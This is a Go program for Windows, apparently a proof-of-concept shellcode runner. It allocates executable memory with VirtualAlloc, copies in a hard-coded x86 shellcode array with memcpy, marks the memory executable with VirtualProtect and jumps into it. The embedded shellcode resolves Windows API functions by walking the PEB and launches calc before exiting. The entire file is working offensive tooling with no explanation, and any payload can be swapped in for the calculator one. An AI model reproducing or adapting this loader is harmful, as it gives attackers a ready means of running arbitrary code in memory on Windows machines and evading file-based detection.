package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect = kernel32.MustFindProc("VirtualProtect")

	msvcrt = syscall.MustLoadDLL("msvcrt.dll")
	memcpy = msvcrt.MustFindProc("memcpy")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	shellcode := []byte{
		0x31, 0xc9, 0xf7, 0xe1, 0x64, 0x8b, 0x41,
		0x30, 0x8b, 0x40, 0x0c, 0x8b, 0x70, 0x14, 0xad, 0x96, 0xad, 0x8b,
		0x58, 0x10, 0x8b, 0x53, 0x3c, 0x01, 0xda, 0x8b, 0x52, 0x78, 0x01,
		0xda, 0x8b, 0x72, 0x20, 0x01, 0xde, 0x31, 0xc9, 0x41, 0xad, 0x01,
		0xd8, 0x81, 0x38, 0x47, 0x65, 0x74, 0x50, 0x75, 0xf4, 0x81, 0x78,
		0x0a, 0x72, 0x65, 0x73, 0x73, 0x75, 0xeb, 0x8b, 0x72, 0x24, 0x01,
		0xde, 0x66, 0x8b, 0x0c, 0x4e, 0x49, 0x8b, 0x72, 0x1c, 0x01, 0xde,
		0x8b, 0x14, 0x8e, 0x01, 0xda, 0x89, 0xd5, 0x31, 0xc9, 0x68, 0x73,
		0x41, 0x61, 0x61, 0x66, 0x81, 0x6c, 0x24, 0x02, 0x61, 0x61, 0x68,
		0x6f, 0x63, 0x65, 0x73, 0x68, 0x74, 0x65, 0x50, 0x72, 0x68, 0x43,
		0x72, 0x65, 0x61, 0x54, 0x53, 0xff, 0xd2, 0x31, 0xc9, 0xb1, 0xff,
		0x31, 0xff, 0x57, 0xe2, 0xfd, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89,
		0xe1, 0x51, 0x51, 0x31, 0xd2, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52,
		0x51, 0x52, 0xff, 0xd0, 0x83, 0xc4, 0x10, 0x68, 0x65, 0x73, 0x73,
		0x61, 0x66, 0x83, 0x6c, 0x24, 0x03, 0x61, 0x68, 0x50, 0x72, 0x6f,
		0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x54, 0x53, 0xff, 0xd5, 0x31,
		0xc9, 0x51, 0xff, 0xd0}

	addr := VirtualAllocFunc(shellcode)

	fmt.Printf("[address]\n 0x%d\n\n", int(addr))

	memcpyFunc(addr, shellcode)

	VirtualProtectFunc(addr, shellcode)

	_, _, err := syscall.Syscall(addr, 0, 0, 0, 0)
	if err != 0 {
		fmt.Printf("[Syscall]\n%s\n", err)
	}
}

func VirtualAllocFunc(shellcode []byte) uintptr {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		fmt.Printf("[VirtualAlloc]\n%s\n", err)
	}
	return addr
}

func memcpyFunc(addr uintptr, shellcode []byte) {
	_, _, err := memcpy.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		fmt.Printf("[memcpy]\n%s\n", err)
	}
}

func VirtualProtectFunc(addr uintptr, shellcode []byte) {
	oldProtect := PAGE_EXECUTE_READWRITE
	_, _, err := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		fmt.Printf("[VirtualProtect]\n%s\n", err)
	}
}
